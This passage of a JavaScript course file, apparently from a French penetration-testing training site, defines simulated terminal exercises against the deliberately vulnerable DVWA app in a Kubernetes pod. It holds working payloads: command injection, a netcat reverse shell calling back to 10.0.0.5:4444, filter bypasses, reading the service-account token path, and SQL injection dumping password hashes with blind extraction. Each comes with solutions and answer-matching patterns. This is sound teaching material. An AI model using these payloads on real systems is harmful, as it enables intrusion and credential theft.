            solution: "127.0.0.1; ls /var/run/secrets/kubernetes.io/serviceaccount",
            sortie: "ca.crt  namespace  token   <-- on est bien dans un pod Kubernetes"
          }
        ]
      },

      /* ---- N2 : reverse shell = accès initial (TP5 ex1) ---- */
      {
        type: "terminal",
        id: "term-dvwa-cmdi-shell",
        titre: "Niveau 2 — De l'injection au reverse shell (accès initial)",
        terminal: "attaquant + DVWA",
        invite: "attacker@kali:~$",
        cours: "Une commande unique ne suffit pas pour travailler : on veut un shell interactif. On écoute sur sa machine, on fait revenir le pod vers nous (reverse shell), puis on stabilise le shell. C'est l'accès initial du TP5 (ex.1) qui alimente les exercices Kubernetes.",
        exemple: {
          legende: "Écouter, puis faire revenir la cible",
          code: "nc -lvnp 4444        # sur l'attaquant\n127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh   # charge DVWA"
        },
        intro: [
          "Two contexts alternate: your attacker machine (listener) and the DVWA field (payload).",
          "Start a listener, send a reverse-shell payload through the injection, catch the shell — which lands you INSIDE the pod — then stabilise it and locate the token."
        ],
        accueil: "Reverse shell — 'help' for a hint, 'solution' to reveal a command/payload.",
        objectifs: [
          {
            enonce: "Sur votre machine, démarrer un **listener** netcat sur le port 4444.",
            indice: "nc -lvnp 4444",
            lieu: "Machine de l'attaquant (en écoute)",
            motifs: ["^nc\\s", "-lvnp", "4444"],
            solution: "nc -lvnp 4444",
            sortie: "listening on [any] 4444 ..."
          },
          {
            enonce: "Dans le champ DVWA, injecter un **reverse shell** vers `10.0.0.5:4444`.",
            indice: "127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh  (ou via /dev/tcp)",
            lieu: "Champ DVWA → la charge s'exécute dans le pod et rappelle l'attaquant",
            invite: "DVWA[cmd-injection] IP>",
            motifs: ["4444", "(nc|/dev/tcp|socat)", "(/bin/sh|/bin/bash)"],
            solution: "127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh",
            sortie: "(le champ ne renvoie rien : la connexion part vers l'attaquant)"
          },
          {
            enonce: "Le shell est reçu : confirmer l'identité (vous êtes dans le pod).",
            indice: "Une commande de trois lettres.",
            lieu: "Reverse shell OBTENU → dans le conteneur du pod DVWA (www-data)",
            invite: "www-data@dvwa-7d9f:/var/www/html$",
            motifs: ["^id\\b"],
            solution: "id",
            sortie: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
          },
          {
            enonce: "Stabiliser le shell en TTY interactif (Python).",
            indice: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            lieu: "Reverse shell dans le pod DVWA",
            motifs: ["python3", "pty", "spawn"],
            solution: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            sortie: "www-data@dvwa-7d9f:/var/www/html$ (shell interactif stabilisé)"
          },
          {
            enonce: "Localiser le token du ServiceAccount pour préparer le pivot vers le cluster.",
            indice: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
            lieu: "Dans le pod DVWA → prêt pour le chapitre « Pentest Kubernetes »",
            motifs: ["^ls\\s", "serviceaccount"],
            solution: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
            sortie: "ca.crt  namespace  token"
          }
        ]
      },

      /* ---- N3 : contourner les filtres (Medium/High) ---- */
      {
        type: "terminal",
        id: "term-dvwa-cmdi-bypass",
        titre: "Niveau 3 — Contourner les filtres (Medium / High)",
        terminal: "DVWA ▸ Command Injection ▸ sécurité renforcée",
        invite: "DVWA[cmd-injection/filtered] IP>",
        cours: "En Medium/High, DVWA retire certains séparateurs (`;`, `&&`). On contourne avec d'autres : pipe, saut de ligne encodé, accents graves, et exfiltration « aveugle » vers un fichier web. Objectif : montrer pourquoi une liste noire ne protège pas.",
        exemple: {
          legende: "Séparateur alternatif quand ; est filtré",
          code: "127.0.0.1| id"
        },
        intro: [
          "Security is now Medium/High: the `;` separator is stripped. You must reach code execution with other tricks.",
          "Each objective forbids the naive `;` and asks for a different bypass."
        ],
        accueil: "Filter bypass — 'help' for a hint, 'solution' to reveal a payload.",
        objectifs: [
          {
            enonce: "`;` est filtré : exécuter `id` via un **pipe** `|`.",
            indice: "127.0.0.1| id",
            lieu: "Champ DVWA filtré → exécuté dans le pod",
            motifs: ["127\\.0\\.0\\.1", "\\|\\s*id\\b"],
            interdire: [";"],
            solution: "127.0.0.1| id",
            sortie: "uid=33(www-data) gid=33(www-data)"
          },
          {
            enonce: "Contourner via un **saut de ligne encodé** `%0a`.",
            indice: "127.0.0.1%0a id",
            lieu: "Champ DVWA filtré → exécuté dans le pod",
            motifs: ["127\\.0\\.0\\.1", "%0a", "id\\b"],
            interdire: [";", "\\|"],
            solution: "127.0.0.1%0a id",
            sortie: "uid=33(www-data) gid=33(www-data)"
          },
          {
            enonce: "Contourner via une **substitution** par accents graves.",
            indice: "Entourez la commande d'accents graves : 127.0.0.1`id`",
            lieu: "Champ DVWA filtré → exécuté dans le pod",
            motifs: ["127\\.0\\.0\\.1", "`id`"],
            interdire: [";", "\\|", "%0a"],
            solution: "127.0.0.1`id`",
            sortie: "(ping tente de résoudre le résultat de `id` : la commande est bien exécutée)"
          },
          {
            enonce: "Exfiltration **aveugle** : écrire la sortie dans un fichier du webroot pour le consulter ensuite.",
            indice: "127.0.0.1| id > /var/www/html/o.txt",
            lieu: "Champ DVWA filtré → écrit dans le pod, lisible via le navigateur",
            motifs: ["127\\.0\\.0\\.1", "id", ">", "/var/www/html"],
            solution: "127.0.0.1| id > /var/www/html/o.txt",
            sortie: "(o.txt créé — ouvrez http://<dvwa>/o.txt pour lire la sortie)"
          }
        ]
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Injection SQL (DVWA), 3 niveaux
     ========================================================= */
  C.chapitres.push({
    id: "ch-dvwa-sqli",
    titre: "Chapitre 8 — Injection SQL (DVWA)",
    description: "Trois terminaux où votre saisie est la charge du champ « User ID » : injection de base, extraction par UNION (niveau TP), puis injection à l'aveugle (booléenne et temporelle).",
    exercices: [

      /* ---- N1 : bases ---- */
      {
        type: "terminal",
        id: "term-dvwa-sqli-basic",
        titre: "Niveau 1 — Injection SQL de base",
        terminal: "DVWA ▸ SQL Injection ▸ champ « User ID »",
        invite: "DVWA[sql-injection] User ID>",
        cours: "Le champ « User ID » construit `... WHERE user_id = '<saisie>'`. Une apostrophe sort de la chaîne. On confirme l'injection, on compte les colonnes, on prépare l'UNION. `-- -` commente la fin de la requête.",
        exemple: {
          legende: "Rendre la condition toujours vraie",
          code: "1' OR '1'='1"
        },
        intro: [
          "This terminal simulates the DVWA « User ID » field (security = Low). Your input is the SQL payload.",
          "Confirm the injection, find the column count, then read the database version with a UNION."
        ],
        accueil: "SQL injection (Low) — 'help' for a hint, 'solution' to reveal a payload.",
        objectifs: [
          {
            enonce: "Confirmer l'injection : condition **toujours vraie** (`OR '1'='1`).",
            indice: "1' OR '1'='1",
            lieu: "Champ DVWA → requête MySQL dans le pod",
            motifs: ["OR\\s+'?1'?\\s*=\\s*'?1"],
            solution: "1' OR '1'='1",
            sortie: "ID: 1  First name: admin  Surname: admin\nID: 2  First name: Gordon ...  (toutes les lignes)"
          },
          {
            enonce: "Trouver le **nombre de colonnes** avec `ORDER BY`.",
            indice: "1' ORDER BY 2 -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["ORDER\\s+BY", "--"],
            solution: "1' ORDER BY 2 -- -",
            sortie: "(2 = OK ; ORDER BY 3 renverrait « Unknown column » : 2 colonnes)"
          },
          {
            enonce: "Injecter un `UNION SELECT` à 2 colonnes.",
            indice: "1' UNION SELECT 1,2 -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["UNION\\s+SELECT", "1,2", "--"],
            solution: "1' UNION SELECT 1,2 -- -",
            sortie: "First name: 1  Surname: 2   (les colonnes 1 et 2 s'affichent)"
          },
          {
            enonce: "Lire la **version** de la base via l'UNION.",
            indice: "1' UNION SELECT null, version() -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["UNION\\s+SELECT", "version", "--"],
            solution: "1' UNION SELECT null, version() -- -",
            sortie: "Surname: 8.0.36-0ubuntu0.22.04"
          }
        ]
      },

      /* ---- N2 : extraction par UNION (TP) ---- */
      {
        type: "terminal",
        id: "term-dvwa-sqli-union",
        titre: "Niveau 2 — Extraire la base par UNION (niveau TP)",
        terminal: "DVWA ▸ SQL Injection ▸ champ « User ID »",
        invite: "DVWA[sql-injection] User ID>",
        cours: "Avec l'UNION maîtrisé, on cartographie la base via `information_schema`, puis on extrait les identifiants et les empreintes de la table `users`.",
        exemple: {
          legende: "Extraire identifiants et empreintes",
          code: "1' UNION SELECT user, password FROM users -- -"
        },
        intro: [
          "You already control a 2-column UNION on the User ID field.",
          "Enumerate tables and columns via information_schema, then dump the users table."
        ],
        accueil: "UNION extraction — 'help' for a hint, 'solution' to reveal a payload.",
        objectifs: [
          {
            enonce: "Lister les **tables** de la base via `information_schema`.",
            indice: "1' UNION SELECT null, table_name FROM information_schema.tables -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["UNION\\s+SELECT", "information_schema\\.tables", "--"],
            solution: "1' UNION SELECT null, table_name FROM information_schema.tables -- -",
            sortie: "Surname: users\nSurname: guestbook ..."
          },
          {
            enonce: "Lister les **colonnes** de la table `users`.",
            indice: "… FROM information_schema.columns WHERE table_name='users' -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["UNION\\s+SELECT", "information_schema\\.columns", "users", "--"],
            solution: "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- -",
            sortie: "Surname: user_id\nSurname: user\nSurname: password ..."
          },
          {
            enonce: "**Extraire** les identifiants et empreintes de `users`.",
            indice: "1' UNION SELECT user, password FROM users -- -",
            lieu: "Champ DVWA → requête MySQL (fuite de données)",
            motifs: ["UNION\\s+SELECT", "FROM\\s+users", "password"],
            solution: "1' UNION SELECT user, password FROM users -- -",
            sortie: "First name: admin  Surname: 5f4dcc3b5aa765d61d8327deb882cf99\n(empreintes MD5 à casser hors ligne)"
          },
          {
            enonce: "Afficher l'**utilisateur MySQL** courant de l'application.",
            indice: "1' UNION SELECT null, current_user() -- -",
            lieu: "Champ DVWA → requête MySQL",
            motifs: ["UNION\\s+SELECT", "current_user", "--"],
            solution: "1' UNION SELECT null, current_user() -- -",
            sortie: "Surname: dvwa@localhost   (privilèges à vérifier côté défense)"
          }
        ]
      },

      /* ---- N3 : injection à l'aveugle (harder) ---- */
      {
        type: "terminal",
        id: "term-dvwa-sqli-blind",
        titre: "Niveau 3 — Injection à l'aveugle (booléenne et temporelle)",
        terminal: "DVWA ▸ SQL Injection (Blind)",
        invite: "DVWA[sql-blind] User ID>",
        cours: "Quand aucune donnée ne s'affiche, on déduit l'information d'un comportement : différence de page (booléen) ou délai de réponse (temporel). Plus lent, mais imparable. C'est le niveau le plus exigeant.",
        exemple: {
          legende: "Faire « dormir » la base pour déduire une réponse",
          code: "1' AND SLEEP(5) -- -"
        },
        intro: [
          "Blind SQL injection: the page never prints query data. You infer it from true/false page changes or response delays.",
          "Work up from a boolean oracle to a time-based, character-by-character extraction."
        ],
        accueil: "Blind SQLi — 'help' for a hint, 'solution' to reveal a payload.",
        objectifs: [
          {
            enonce: "Établir l'oracle **booléen vrai** (`AND '1'='1`).",
            indice: "1' AND '1'='1",
            lieu: "Champ DVWA → requête MySQL (blind)",
            motifs: ["AND\\s+'?1'?\\s*=\\s*'?1"],
            solution: "1' AND '1'='1",
            sortie: "User ID exists in the database.   (condition vraie : page « normale »)"
          },
          {
            enonce: "Établir l'oracle **booléen faux** (`AND '1'='2`).",
            indice: "1' AND '1'='2",
            lieu: "Champ DVWA → requête MySQL (blind)",
            motifs: ["AND\\s+'?1'?\\s*=\\s*'?2"],
            solution: "1' AND '1'='2",
            sortie: "User ID is MISSING from the database.   (condition fausse : page différente)"
          },
          {
            enonce: "Extraire par booléen : premier caractère de la version vaut-il `8` ?",
            indice: "1' AND SUBSTRING(version(),1,1)='8",
            lieu: "Champ DVWA → requête MySQL (blind)",
            motifs: ["SUBSTRING", "version"],
            solution: "1' AND SUBSTRING(version(),1,1)='8",
            sortie: "User ID exists ...  → le 1er caractère de la version est bien « 8 »"
          },
          {
            enonce: "Passer au **temporel** : forcer un délai de 5 secondes (`SLEEP`).",
            indice: "1' AND SLEEP(5) -- -",
            lieu: "Champ DVWA → requête MySQL (blind, temporel)",
            motifs: ["SLEEP\\(", "--"],
            solution: "1' AND SLEEP(5) -- -",
            sortie: "(la réponse arrive après ~5 s : le canal temporel fonctionne)"
          },
          {
            enonce: "Extraction **temporelle conditionnelle** du 1er caractère du mot de passe.",
            indice: "… AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -",
            lieu: "Champ DVWA → requête MySQL (blind, exfiltration)",
            motifs: ["IF\\(", "SLEEP", "SUBSTRING", "password"],
            solution: "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -",
            sortie: "(délai de 3 s si le caractère testé est « a » ; on itère sur chaque position)"
          }
        ]
      }
    ]
  });

})();
